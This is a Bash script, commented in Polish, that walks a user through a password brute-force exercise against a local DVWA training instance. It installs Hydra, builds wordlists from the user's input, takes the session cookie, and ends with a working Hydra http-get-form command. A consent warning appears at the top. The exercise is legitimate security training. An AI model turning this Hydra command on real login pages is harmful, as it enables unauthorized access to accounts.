#!/bin/bash

echo "Zaczynamy to co misie lubią najbardziej. Trzeba natomiast tutaj pamiętać, że takie testy możemy wykonywać jedynie za zgodą. Inaczej można skończć jak taki człowiek z "miasta", niejaki Radosław Psikuta bez S na końcu :)"

sleep 30

sudo apt update


sudo apt install hydra												# Instalacja narzędzia do przeprowadzania ataku.


echo "Instalacja hydry zakończona"


dvwa_url="http://127.0.0.1/dvwa/security.php"


														# Tutaj poszliśmy na ręczne dane, bo będzie się to u każdego różnić 

echo "Proszę otworzyć przeglądarkę internetową i przejść na stronę: $dvwa_url"

echo "Następnie zmienić ustawienia bezpieczeństwa z "Impossible" na "Low" - akcję trzeba potwierdzić przyciskiem "Submit""

echo "Po wykonaniu operacji prozę ją potwierdzić w terminalu"

sleep 15


read -p "Czy ustawienia bezpieczeństwa zostały zmienione na 'Low'? (Naciśnij Enter): " confirmation



														# Zbieramy dane do bazy którą użyjemy w teście.

for i in {1..5}; do

    read -p "Podaj login $i: " login

    logins+=("$login")


    														#Tutaj kodujemy dane do logowania (poprawne) i dodajemy do wyboru użytkownika
    login_with_admin="${login}admin"

    logins+=("$login_with_admin")



    read -p "Podaj hasło $i: " password

    passwords+=("$password")

 														# Analogicznie do hasła

    password_with_default="${password}password"

    passwords+=("$password_with_default")

done


echo "${logins[@]}" > login.txt

echo "${passwords[@]}" > hasla.txt

echo "Pomyślnie utworzono pliki login.txt i hasla.txt z podanymi danymi."

echo "Proszę otworzyć przeglądarkę i przejść na stronę: http://127.0.0.1/dvwa/vulnerabilities/brute/"

echo "Następnie proszę otwórzyć konsolę dewelopera przeglądarki (F12), przejdź do zakładki Application i następnie Cookies"

echo "Skopiuj wartość z pliku cookie PHP o nazwie 'PHPSESSID'."


sleep 30


read -p "Proszę wprowadzić wartość z pliku cookie PHP (PHPSESSID): " php_session_id


echo "Pobrane dane : PHPSESSID=$php_session_id"


															# Uruchamiamy hydre, wpisujemy dane od uzytkownika i cieszymy sie "matrixem" na ekranie (jak wszystko pójdzie dobrze)


hydra -V -L login.txt -P hasla.txt "http-get-form://http://127.0.0.1:80/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login:H=Cookie\:PHPSESSID=$php_session_id;security=low:F=Username and/or password incorrect"

